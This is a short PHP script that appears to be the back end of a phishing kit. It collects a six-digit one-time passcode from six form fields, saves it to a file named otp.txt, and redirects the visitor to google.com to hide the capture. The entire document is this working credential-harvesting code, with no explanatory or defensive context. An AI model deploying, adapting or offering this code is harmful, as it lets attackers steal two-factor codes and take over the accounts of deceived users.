<?php
if ($_SERVER["REQUEST_METHOD"] == "POST"){
$input1_value = $_POST['input1'];
$input2_value = $_POST['input2'];
$input3_value = $_POST['input3'];
$input4_value = $_POST['input4'];
$input5_value = $_POST['input5'];
$input6_value = $_POST['input6'];

	
	$file = fopen("otp.txt","w");
	$data = "OTP: $input1_value$input2_value$input3_value$input4_value$input5_value$input6_value";
	fwrite($file, $data);
	fclose($file);
	header("Location: https://www.google.com");
	}
	?>